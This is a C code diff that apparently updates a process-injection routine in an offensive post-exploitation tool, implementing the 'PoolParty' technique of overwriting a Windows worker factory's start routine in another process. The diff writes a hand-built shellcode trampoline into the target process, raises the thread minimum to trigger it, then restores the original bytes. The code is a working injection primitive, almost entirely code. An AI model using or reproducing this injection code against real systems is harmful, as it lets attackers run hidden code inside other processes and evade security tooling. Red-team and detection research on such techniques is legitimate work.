@@ -282,6 +282,7 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 
 DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* hTriggerEvent) {
 	DWORD dwResult = 0x1337; // just a random value to change later.
+	DWORD dwStubSize = 18;
 	do {
 		GetOrInitNtDll();
 		if (pNtDll == NULL) {
@@ -301,42 +302,33 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		if (dwResult != STATUS_SUCCESS || ReturnLength > sizeof(WORKER_FACTORY_BASIC_INFORMATION) || WorkerFactoryBasicInfo.StartRoutine == NULL) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtQueryInformationWorkerFactory failed.",ERROR_NOT_SUPPORTED);
 		}
-		unsigned char* shellcode = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 18);
+		unsigned char* shellcode = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwStubSize);
 		if (shellcode == NULL) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] shellcode is NULL", ERROR_NOT_SUPPORTED);
 		}
 		if (dwDestinationArch == PROCESS_ARCH_X64) {
 			unsigned char tmp[] = {0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 			uintptr_t StubAddress = (uintptr_t)lpStartAddress;
-			memcpy(shellcode, &tmp, 18);
+			memcpy(shellcode, &tmp, sizeof(tmp));
 			memcpy(shellcode + 10, &StubAddress, sizeof(StubAddress));
 		}
 		else {
 			unsigned char tmp[] = {0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00};
 			unsigned __int32 StubAddress = (unsigned __int32)((uintptr_t)lpStartAddress);
-			memcpy(shellcode, &tmp, 14);
+			memcpy(shellcode, &tmp, sizeof(tmp));
 			memcpy(shellcode + 10, &StubAddress, sizeof(StubAddress));
 		}
-		unsigned char OriginalBytes[18] = { 0x00 };
-		if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), NULL)) {
+		unsigned char* OriginalBytes = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwStubSize);
+		if (OriginalBytes == NULL) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] OriginalBytes is NULL", ERROR_NOT_SUPPORTED);
+		}
+		if (!ReadProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, OriginalBytes, dwStubSize, NULL)) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] ReadProcessMemory failed.", ERROR_NOT_SUPPORTED);
 		}
 		
 		SIZE_T szWritten = 0;
-		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, shellcode, 18, &szWritten) || szWritten != sizeof(shellcode)) {
+		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, shellcode, dwStubSize, &szWritten) || szWritten != dwStubSize) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't write stub to WorkerFactory's start routine.", ERROR_NOT_SUPPORTED);
-		}
-		WorkerFactoryBasicInfo.Timeout.QuadPart = 0x00;
-		WorkerFactoryBasicInfo.IdleTimeout.QuadPart = 0x00;
-		dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryTimeout, &WorkerFactoryBasicInfo.Timeout, sizeof(LARGE_INTEGER));
-		dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryTimeout returned 0x%x", dwResult);
-		if (dwResult != STATUS_SUCCESS) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryTimeout failed.", ERROR_NOT_SUPPORTED);
-		}
-		dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryIdleTimeout, &WorkerFactoryBasicInfo.IdleTimeout, sizeof(LARGE_INTEGER));
-		dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryIdleTimeout returned 0x%x", dwResult);
-		if (dwResult != STATUS_SUCCESS) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryTimeout failed.", ERROR_NOT_SUPPORTED);
 		}
 		WorkerFactoryBasicInfo.ThreadMinimum++; //Increase minimum thread number to create a new thread.
 		dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
@@ -344,9 +336,15 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		if (dwResult != STATUS_SUCCESS) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory failed.", ERROR_NOT_SUPPORTED);
 		}
-		/*if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, &OriginalBytes, sizeof(OriginalBytes), &szWritten) || szWritten != sizeof(OriginalBytes)) {
-			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't restore original bytes.", ERROR_NOT_SUPPORTED);
-		}*/
+		Sleep(1000);
+		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, OriginalBytes, dwStubSize, &szWritten) || szWritten != dwStubSize) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't restore the original bytes.", ERROR_NOT_SUPPORTED);
+		}
+		WorkerFactoryBasicInfo.ThreadMinimum--;
+		DWORD dwResult1 = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
+		if (dwResult1 != STATUS_SUCCESS) {
+			dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for restoring ThreadMinimum returned 0x%x", dwResult1);
+		}
 	} while (0);
 	return dwResult;
 }
